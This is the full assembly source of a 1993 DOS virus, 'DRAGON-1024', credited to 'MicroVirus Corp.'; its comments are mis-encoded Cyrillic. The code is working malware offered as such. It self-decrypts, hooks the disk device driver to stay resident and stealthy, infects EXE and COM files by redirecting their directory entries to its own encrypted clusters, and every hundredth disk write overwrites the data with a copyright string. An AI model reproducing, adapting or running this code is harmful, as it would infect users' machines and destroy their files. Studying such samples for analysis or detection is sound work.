;                     浜様様様様様様様様様様様様様様�
;                     �       MicroVirus Corp.      裁�
;                     �         Author: anti        裁�
;                     �     VIRUS FAMILY:  Dragon   裁�
;                     �         VERSION: 1.0        裁�
;                     藩様様様様様様様様様様様様様様勺�
;                       栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�

;             浜様様様様様様様様様様様様様冤様様様様様様様様融
;             �  Name:      DARGON-1024   � Target: EXE, COM 裁�
;             �  Rating:    Dangerous     � Stealth:    Yes  裁�
;             �  Tsr:                Yes  � Phantom:    Yes  裁�
;             �  Arming:             Yes  � Danger(6):    4  裁�
;             �  Attac Speed:   Very Fast � Clock:       No  裁�
;             �  Text Strings:       Yes  � Echo:       Yes  裁�
;             把陳陳陳陳陳陳陳陳陳陳陳陳陳祖陳陳陳陳陳陳陳陳超栩
;             �  Find Next Target:   SCANING ROOT DIRECTORY  裁�
;             �  Other viruses:      none                    裁�
;             藩様様様様様様様様様様様様様様様様様様様様様様夕栩
;               栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩

code		segment	para	'code'
		assume	cs:code,ds:code
		org	100h

dragon		proc
		mov	di,offset Begin		;��ц�籥�→� ※珮��
		mov	cx,1010

		mov	ax,00h			;��鈑 か� ��瘉�籥�→� (�キ錺矚�)
Decode:		xor	word ptr [di],ax
		inc	di
		loop	Decode

Begin:		mov	ah,30h			;�����荐��ガ ▲珀��
		int	21h			;DOS

		cmp	al,04h			;DOS 4.x+ : SI = 0
		sbb	si,si			;DOS 2/3  : SI = -1

		mov	ah,52h			;�����荐��ガ �い爛� DOS List of
		int	21h			;List � 爛��痰琺 ES:BX

		lds	bx,es:[bx]		;DS:BX 礫�щ��モ �� �ム�覃 DPB
						;( Drive Parametr Block)
search:		mov	ax,[bx+si+15h]		;���牀� 瓮��キ�� む��▲��
		cmp	ax,70h			;�皰 む��▲� え瓷�?
		jne	next			;�甄� �モ ▼閧� 甄イ竡薑� む���.
		xchg	ax,cx			;���メ皋碎 瓮��キ� � CX
		mov	[bx+si+18h],byte ptr -1
		mov	di,[bx+si+13h]		;��縲��錺� 甃ラキ┘ む��▲��
						;�むメ �爬�キ��讚��� む��▲��
						;� CX:DI

		mov	[bx+si+13h],offset header ;������碎 � DPB ��� 甌＝癶キ�.
		mov	[bx+si+15h],cs		;������〓� 竅矗��痰��
next:		lds	bx,[bx+si+19h]		;�э碎 甄イ竡薑� む��▲�
		cmp	bx,-1			;�皰 ��甄イ�┤ む��▲�?
		jne	search			;�甄� �モ �牀▲爬碎 ィ�

		mov	ds,cx			;DS : 瓮��キ� �爬�キ��讚���
						;む��▲��
		les	ax,[di+6]		;ES : �牀罐ゃ�� �爛琺�����
						;AX : �牀罐ゃ�� 痰��皀�┬

		mov	word ptr cs:Strat,ax	;�������碎 轤� あ� �むメ�
		mov	word ptr cs:Intr,es	;か� ぎ��ォ茱�� �甎��讌������

		push	cs
		pop	es

		mov	bx,128			;�瓣�｀え碎 ≡� ���閧� �牀��
		mov	ah,4ah			;2048 ����
		int	21h

		mov	ax,cs			;AX : �むメ ��茱�� MCB
		dec	ax
		mov	es,ax
		mov	word ptr es:[01h],08h	;��瓷�珮ガ瘴 ��� DOS

		push	cs
		pop	ds

		mov	byte ptr Drive+1,-1	;�÷�瘠��ガ ���ム え瓷�

		mov	dx,offset File		;������ガ 皀�竕┤ ��皰���
		mov	ah,3dh			;え瓷� C:
		int	21h

		mov	bx,ds:[2ch]		;�瓣�｀Δ�ガ ���閧� ���閧竡
		mov	es,bx			;PSP
		mov	ah,49h
		int	21h	
		xor	ax,ax
		test	bx,bx			;BX = 0?
		jz	boot			;�甄� ��, 皰 �� ����Ж�� ���閧�
		mov	di,1			;� �� ���竅皋�� ����Ε��覃 ����
seek:		dec	di			;���瓷 ����� ゛��� ����諷 DOS
		scasw
		jne	seek
		lea	dx,[di+2]		;SI 礫�щ��モ �� ━� ����Ε����
		push	es			;�����
		jmp	short exec

boot:		mov	es,ds:[16h]		;���竍�碎 �むメ PSP
		mov	bx,es:[16h]
		dec	bx			;�э碎 ィ� MCB
		xor	dx,dx
		push	es

exec:		push	bx			;�痰���※碎 ゛�� �����モ牀�
		mov	bx,offset param		;�むメ ������き�� 痰牀��
		mov	[bx+4],cs		;�むメ �ム〓�� FCB
		mov	[bx+8],cs		;�むメ ≒�牀�� FCB
		mov	[bx+12],cs
		pop	ds

		mov	ax,4b00h		;���竅皋碎 ����Ε��覃 ����
		int	21h
		mov	ah,4ch			;�覃皋 � DOS
		int	21h

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�               *** Device Driver's Strategy Block ***              �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

Strategy:	pushf
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds

		push	es
		pop	ds

		mov	ah,[bx+2]		;AH : ������� DOS
		cmp	ah,04h			;�〓� ( 腑皀�┘)?
		je	Work			;�甄� �モ - �牀ぎ�Θ碎 �牀▲爲�
		cmp	ah,08h			;�襤�� ( ����瘡)?
		je	Work			;�甄� �モ - �牀ぎ�Θ碎 �牀▲爲�
		cmp	ah,09h			;�襤�� � ���矗��ガ?
		je	Work			;�甄� �モ �覃皋
		jmp	FuckOut

Work:		call	OrigDrive		;｡��｀碎 �����ゃ DOS
		call	CheckDrive		;�皰 ���覃 え瓷?
		je	CheckData		;�� - ����Ж碎 ィ�
		call	InfectDisk

CheckData:	mov	ax,[bx+14h]		;���牀� �� 腑皀�┘ 瓱痰ガ���
FirstSector:	cmp	ax,10h			;�，�痰� え瓷�?
		jb	FuckOut			;�� - �覃皋
LastSector:	cmp	ax,21h
		ja	FuckFile

		call	ChangeSector		;����Ж碎 瓮�皰� ��皰����
		jmp	Exit			;�覃皋

FuckFile:	mov	ah,es:[bx+2]		;AH : ������� DOS
		cmp	ah,08h			;�襤�� (腑皀�┘)?
		je	GoAhead			;蹍▲爬碎 ����襯
		cmp	ah,09h			;�襤�� � ���矗��ガ?
		jne	FuckOut			;�モ �覃皋

GoAhead:	mov	ax,es:[bx+14h]		;�モキ┘ 瓱痰ガ��� �゛�痰�
		cmp	ax,word ptr cs:LastSector+1 ;え瓷�?
		jb	FuckOut			;�� - �覃皋
		inc	cs:RecNum		;�▲��腮碎 ���ム ����瓱
		cmp	cs:RecNum,64h		;�皰 100 ����瘡?
		jne	FuckOut			;�モ �覃皋
		mov	cs:RecNum,00h		;｡�祀�碎 腮甄� ����瓮�
		call	DestroyFile		;��о竏�碎 ����瘠��ガ襯 ����襯

FuckOut:	call	OrigDrive		;�襷��碎 �爬�キ��讚覃 む��▲�
Exit:		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf
Inter:		retf				;�覃皋

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�                      *** Infect Disk ***                          �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

InfectDisk	proc	near
		cld				;�������碎 ������〓� ���牀��
		mov	cx,0bh			;� 痰オ�
		mov	si,bx
Save:		lodsw
		push	ax
		loop	Save

		mov	word ptr [bx+0eh],offset VirusEnd ;�痰���※碎 瓣�� 
		mov	word ptr [bx+10h],cs	;＜粐ム か� 腑皀��� � え瓷�
		mov	byte ptr [bx+2],02h	;�����荐��ガ BPB
		call	OrigDrive		;( BIOS Parametr Block)

		lds	si,[bx+12h]		;DS:SI : �むメ BPB

		mov	ax,[si+11]		;AX : 腮甄� 瓮�皰牀� FAT
		mov	word ptr cs:FatSec1+3,ax
		push	ax
		dec	ax
		mov	cx,[si]			;CX : ��Кム 瓮�皰�� � ������
		mul	cx			;AX : ��Кム FAT � ������
		mov	word ptr cs:FatSecSize+2,ax
		pop	ax
		shl	ax,01h
		add	ax,[si+3]		;AX : �オ皰� ��������
		mov	word ptr cs:FirstSector+1,ax
		push	ax

		xor	dx,dx
		mov	ax,[si]
		mov	word ptr cs:Bytes+1,ax
		mov	cx,20h
		div	cx
		mov	cx,ax
		mov	ax,[si+6]		;AX : ��Кム ��������
		div	cx

		pop	di
		add	di,ax			;DI : �ム�覃 瓮�皰� �゛�痰�
		mov	word ptr cs:LastSector+1,di ;����諷
		mov	ax,[si+8]		;AX : �♂ゥ 腮甄� 瓮�皰牀�
		push	ax
		xor	cx,cx
		mov	cl,[si+2]		;CX : 腮甄� 瓮�皰牀� � ���痰ム�
		mov	word ptr cs:Cluster+1,cx

		sub	ax,cx			;��キ跏�碎 腮甄� 瓮�皰牀� ��
		mov	word ptr cs:StartSector+3,ax ;��Кム �き��� ���痰ム�
		pop	ax
		sub	ax,di
		xor	dx,dx
		div	cx
		inc	ax

		push	es
		pop	ds

FatSec1:	mov	word ptr [bx+14h],01h	;����ガ ��甄イ�┤ 瓮�皰� FAT
		mov	word ptr [bx+12h],01h
		mov	byte ptr [bx+2],04h
		call	OrigDrive
		lds	si,[bx+0eh]		;DS:SI : 礫�щ��モ �� 瘍�����覃
						;瓮�皰�
		push	bp

		mov	bp,ax			;BP : 腮甄� ���痰ム��
		cmp	ax,0ff6h		;�皰 16 ；皰�覃 FAT?
		jae	Fat16Bit		;�甄� �モ �牀ぎ�Θ碎

More12Bit:	mov	ax,bp			;ｯ爛ぅ�キ┘ 甃ラキ�� か�
		mov	cx,03h			;��甄イ�ィ� ���痰ム� え瓷�
		mul	cx
		shr	ax,01h

		mov	di,ax			;DI : �むメ 蹕ガキ�� FAT �
		add	di,si			;＜粐ム�
FatSecSize:	sub	di,100h
		mov	ax,bp
		test	ax,01h			;�皰 腑皚覃 ���ム ���痰ム�?融
		mov	ax,[di]			;AX : 蹕ガキ� FAT           �
		jnz	Chet			;�甄� �モ �牀ぎ�Θ碎      夕

		and	ax,0fffh		;｡�祀�碎 痰�琥┘ 4 ；��
		jmp	GoOn

Chet:		mov	cl,04h			;�あ┃竄� �� 4 ；�� ←ア�
		shl	ax,cl
		jmp	GoOn

GoOn:		cmp	ax,0ff7h		;�皰 ���絎� ���痰ム ( BAD)
		je	Bad12Bit		;�甄� �モ �牀ぎ�Θ碎

		test	bp,01h			;�皰 腑皚覃 ���痰ム
		jnz	ChetCluster		;�モ - �牀ぎ�Θ碎
		or	ax,0fffh		;���モ�碎 ���痰ム ��� ��甄イ�┤
		mov	[di],ax			;� 罐��腦� ( EOF)
		jmp	Contin

ChetCluster:	mov	dx,0fffh		
		mov	cl,04h
		shl	dx,cl
		or	ax,dx			;���モ�碎 ���痰ム ��� ��甄イ�┤
		mov	[di],ax			;� 罐��腦� ( EOF)
		jmp	Contin

Rest:		jmp	Fuck

More16Bit:	mov	ax,bp
Fat16Bit:	mov	di,ax
		add	di,si
		sub	di,word ptr cs:FatSecSize+2
		mov	ax,[di]			;AX : 16 ；皰�覃 蹕ガキ� FAT
		cmp	ax,0fff7h		;�皰 ���絎� ���痰ム?
		je	Bad16Bit		;�モ - �牀ぎ�Θ碎
		mov	ax,0ffffh		;���モ�碎 ィ� ��� ��甄イ�┤ �
		mov	[di],ax			;罐��腦� ���痰ム�� ( EOF)
		jmp	Contin

Bad16Bit:	call	bad			;�э碎 �爛るゃ薑� ���痰ム
		jmp	More16Bit		;蹍▲爬碎 ィ�

Bad12Bit:	call	bad			;�э碎 �爛るゃ薑� ���痰ム
		jmp	More12Bit		;蹍▲爬碎 ィ�

Contin:		mov	word ptr cs:Location+1,bp
		pop	bp			;������碎 ├�キキ覃 FAT �� え瓷
		push	es
		pop	ds

		call	Write

		push	es
		push	cs
		push	cs
		pop	ds
		pop	es

		mov	si,100h			;��Г�碎 ����� ※珮��
		mov	di,offset VirusEnd
		mov	cx,1024
		rep	movsb

Again:		mov	ax,40h			;�э碎 甄竍����� 腮甄�
		mov	es,ax
		mov	di,6ch
		mov	ax,word ptr es:[di]

		cmp	ax,00h			;��甄� ��↓� �祀�
		je	Again			;�� ▼閧� む磽�� 腮甄�

		mov	word ptr cs:VirusEnd+7,ax ;��縲���碎 ��鈑 か�
		mov	word ptr cs:Key+1,ax	;��瘉�籥�→�

		mov	di,offset VirusEnd	;��荐籥���碎 ※珮�
		add	di,14
		mov	cx,1010
Key:		mov	ax,00h			;��鈑 か� 荐籥�→� ( �キ錺矚�)
Coding:		xor	word ptr [di],ax
		inc	di
		loop	Coding

		pop	es
		push	es
		pop	ds

		mov	word ptr [bx+0eh],offset VirusEnd
		mov	word ptr [bx+10h],cs	;������碎 ��荐籥�����竡 �����
StartSector:	mov	word ptr [bx+14h],14h	;※珮�� �� え瓷
		mov	word ptr [bx+12h],02h
		call	Write

Fuck:		push	es			;��瘁����※碎 ������〓� ���牀��
		pop	ds
		std
		mov	cx,0bh
		mov	di,bx
		add	di,20
Load:		pop	ax
		stosw
		loop	Load
		ret				;�覃皋
InfectDisk	endp

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�                 *** Infect or Disinfect Directory ***             �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

ChangeSector	proc	near
		xor	dx,dx
		mov	ax,[bx+12h]		;����腑痰〓 瓮�皰牀�
Bytes:		mov	cx,10h			;CX : ��Кム 瓮�皰�� ( �キ錺矚�)
		mul	cx
		mov	di,ax			;DI : ��Кム � ������
		lds	si,[bx+0eh]		;DS:SI : �むメ ＜粐ム� � ����覓�
		add	di,si			;DS:DI : �むメ ����� ＜粐ム�
		xor	cx,cx			;踸Л�� ����Ε���

		push	ds			;��縲���碎 �むメ ＜粐ム�
		push	si

		call	InfectSector		;����Ж碎 �������
		jcxz	NoInfect		;�� ├�キ┼� �������?
		call	Write			;�� - ������碎 �� え瓷

NoInfect:	pop	si			;��瘁����※碎 �むメ ＜粐ム�
		pop	ds
		inc	cl			;踸Л�� �覈竅襤���� ※珮��
						;├ ����Ε��諷 ������
		call	InfectSector		;�覊ョ�碎 �������
		ret				;�覃皋
ChangeSector	endp

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�                   *** Infect or Disinfect Files ***               �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

InfectSector	proc	near
More:		mov	ax,[si+8]		;AX : �ム�襯 あ� ＜��� ��瘉�爛���
		cmp	ax,'XE'			;�皰 EXE- ����?
		jne	COM			;�モ �牀▲爬碎 ���跏�
		cmp	[si+0ah],al
		je	Infect
COM:		cmp	ax,'OC'			;�皰 COM- ����?
		jne	NextFile		;�モ - ▼閧� 甄イ竡薑� ����
		cmp	byte ptr [si+0ah],'M'
		jne	NextFile

Infect:		cmp	word ptr [si+28],1024	;���� �キ跏� 1024 �����?
		jb	NextFile		;�� - ▼閧� 甄イ竡薑� ����
		test	byte ptr [si+0bh],1ch	;�皰 え爛�皰爬� ┼� 瓱痰ガ�覃
						;����
		jnz	NextFile		;�� - ▼閧� 甄イ竡薑� ����
		test	cl,cl			;����Ε�┘?
		jnz	Disinfect		;�� - ����Ж碎 ����

Location:	mov	ax,714			;AX : ���痰ム 甌ぅ爨�薑� ※珮�
						;( �キ錺矚�)
		cmp	ax,[si+1ah]		;�皰 ���� ����Ε�?
		je	NextFile		;�� - ▼閧� 甄イ竡薑� ����
		xchg	ax,[si+1ah]		;����Ж碎 ����, AX : 痰�珥��覃
		xor	ax,666h			;���痰ム �����
		mov	[si+12h],ax		;���メ皋碎 ィ� � �゛�痰� DOS
		inc	ch			;踸Л�� ├�キキ�� ��������
		jmp	NextFile		;�э碎 甄イ竡薑� ����

Disinfect:	xor	ax,ax
		xchg	ax,[si+12h]		;AX : 痰�琺� 痰�珥��覃 ���痰ム
		xor	ax,666h			;����Ε����� �����
		mov	[si+1ah],ax		;�覊ョ�碎 ����

NextFile:	add	si,20h			;�むメ 甄イ竡薀�� �����
		cmp	di,si
		jne	More
		ret
InfectSector	endp

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�                       *** Destroy Files ***                       �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

DestroyFile	proc	near
		push	es
		push	cs
		pop	ds
		les	di,es:[bx+0eh]		;ES:DI : �むメ ����瘠��ガ諷
						;����諷
		mov	si,offset CopyRight	;DS:SI : �むメ 痰牀�� � ┃筮爼��.
		mov	cx,120			;CX : か┃� 痰牀��
		rep	movsb			;���艪�Θ碎 ����襯
		pop	es
		ret				;�覃皋
DestroyFile	endp

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�                       *** Write to Disk ***                       �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

Write		proc	near
		mov	ah,es:[bx+2]		;��縲��錺� �����ゃ DOS
		mov	byte ptr es:[bx+2],08h	;������� �襤�� ( ����瓱)
		call	OrigDrive		;�襷��碎 �爬�┃��讚覃 む��▲�
						;え瓷�
		mov	es:[bx+2],ah		;��瘁����※碎 �����ゃ DOS
		and	byte ptr es:[bx+4],7fh	;�÷�瓱碎 筰�� �荐！�
		ret
Write		endp

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�                         *** Check Disk ***                        �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

CheckDrive	proc	near
		mov	al,[bx+1]		;AL : ���ム え瓷�

drive:		cmp	al,-1			;��瓷 甃キ┼瘴?
		mov	byte ptr cs:[drive+1],al ;�������碎 ���ム え瓷�?
		jne	Change			;�� - �覃皋. �モ �牀▲爬碎 ��
						;甃キ┼瘴 �� 筰���� え瓷
		push	[bx+0eh]
		mov	byte ptr [bx+2],01h	;������� ���矗��� ��瓱皀��
		call	OrigDrive		;�襷��碎 む��▲� え瓷�
		cmp	byte ptr [bx+0eh],01h	;��瓷 甃キ┼瘴?
		pop	[bx+0eh]
		mov	[bx+2],ah		;��瘁����※碎 �����ゃ DOS

Change:		ret
CheckDrive	endp

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�                     *** Get Next Cluster ***                      �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

Bad		proc	near
		dec	bp			;��キ跏�碎 ���ム ���痰ム�
Cluster:	mov	ax,00h			;AX : 腮甄� 瓮�皰牀� � ���痰ム�
						;( �キ錺矚�)
		sub	word ptr cs:StartSector+3,ax
		ret
Bad		endp

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�                *** Call Original Device Drive ***                 �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

OrigDrive	proc	near
	;	jmp	far 70h:xxxxh
		db	9ah			;�襷��碎 �牀罐ゃ珮 �矗�皀�┬
Strat:		dw	?,70h			;�爬�キ��讚��� む��→�� え瓷�
	;	jmp	far 70h:xxxxh
		db	9ah			;�襷��碎 �牀罐ゃ珮 踳琺�����
Intr:		dw	?,70h			;�爬�キ��讚��� む��→�� え瓷�
		ret
OrigDrive	endp

dragon		endp

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�                         *** Data Area ***                         �
;�                               Begin                               �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

header:		inc	ax
		ret
		dw	1
		dw	2000h			;�矜爬＜� 竅矗��痰��:
						;�����〓�, 筮爼�� �� IBM
		dw	offset Strategy		;�むメ ��罐ゃ琺 �矗�皀�┬
		dw	offset Inter		;�むメ �牀罐ゃ琺 踳琺�����
		db	7fh			;��甄� ゛����諷 竅矗��痰�

file		db	'c:\dragon.com',0
param		dw	0,80h,?,5ch,?,6ch,?	;�����モ琺 か� ���竅��
						;����Ε����� �����

CopyRight	db	'DRAGON ver 1.0 Copyright (c) MicroVirus Corp. 1993',0
Lords		db	'The Lords of the Computers !',0,0
Lord		db	'DRAGON - the Lord of Disks !',0,0
Author		db	'anti'
RecNum		db	?			;���ム ����瓱
VirusEnd	db	?

;桎烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝烝�
;�                         *** Data Area ***                         �
;�                                End                                �
;桀樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛樛�

code		ends
		end	dragon